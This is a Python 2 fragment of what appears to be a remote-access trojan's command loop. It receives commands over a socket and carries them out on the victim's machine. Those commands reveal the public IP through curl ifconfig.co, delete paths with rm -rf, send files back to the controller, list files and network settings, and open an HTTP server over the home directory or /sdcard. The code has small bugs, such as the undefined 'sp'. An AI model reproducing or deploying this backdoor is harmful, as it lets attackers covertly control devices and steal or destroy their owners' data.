try:
	while True:
		cmd = s.recv(3048)
		if cmd == "ip":
		
			def ip():	
				process = os.popen("curl ifconfig.co")
				result = process.read()
				return result
			stdout = ip()
		
			s.send(stdout)
		elif cmd == "cd":
			os.chdir("/home")
			s.send("Changed!")
		elif "cd" in cmd:
			fil = cmd.split()[-1]
			os.chdir(fil)
			s.send("Changed ! ")
		elif "rm" in cmd:
			fil = cmd.split()[-1]
			os.system("rm -rf {}".format(fil))
			s.send("deleted ! ")
		elif "mkdir" in cmd:
			fil = cmd.split()[-1]
			os.mkdir(fil)
			s.send("Created ! ")
		elif "rmdir" in cmd:
			fil = cmd.split()[-1]
			os.rmdir(fil)
			s.send("Deleted ! ")
		elif 'rename' in cmd:
				fil = cmd.split()[-2]
				fil1 = cmd.split()[-1]
				os.rename(fil,fil1)
				s.send('Renamed Succesfuly ! ')
		elif "download" in cmd:
			fil = cmd.split()[-1]
			o = open(fil,"rb")
			sep = o.read()
			if "download" in cmd:
				if len(sep) >0:
					s.send(sp)
				elif len(sep) == 0:
					s.send("Invalid File")
		elif "ls" in cmd:
			cop = Popen("ls",stdout=PIPE,stderr=PIPE)
			stdout,stderr = cop.communicate()
			if len(stdout) == 0:
				s.send("Empty File")
			elif len(stdout) > 0:
				s.send("Files\n========\n"+stdout+"\n========")
			else:
				s.send("Error:!")
		elif "ifconfig" in cmd:
			cop = Popen("ifconfig",stdout=PIPE,stderr=PIPE)
			stdout,stderr= cop.communicate()
			s.send(stdout)
		elif 'browse linux' in cmd:
			def ga(com):
				pr = os.popen(com)
				results = pr.read()
				return results

			a = ga("echo $HOME")
			c = a.replace("\n","")
			os.chdir(c)
			i = open(c+'/gc.py','w')
			i.write('import os\nos.system("python2 -m SimpleHTTPServer")')
			i.close()
			
			os.system('nohup python2 '+c+'/gc.py')
		elif 'browse sdcard' in cmd:
		
			i = open('/sdcard/gc.py','w')
			i.write('#!/bin/python \nimport os\nos.system("python2 -m SimpleHTTPServer 1456")')
			i.close()
			
			os.system('nohup python2 /sdcard/gc.py &')
		else:
			pass
except KeyboardInterrupt:
	pass
	s.send('Connection Closed By User :|:')
except IOError:
	s.send('No Such File Or Directory ! ')
except OSError:
	s.send("No such File Or Directory !")

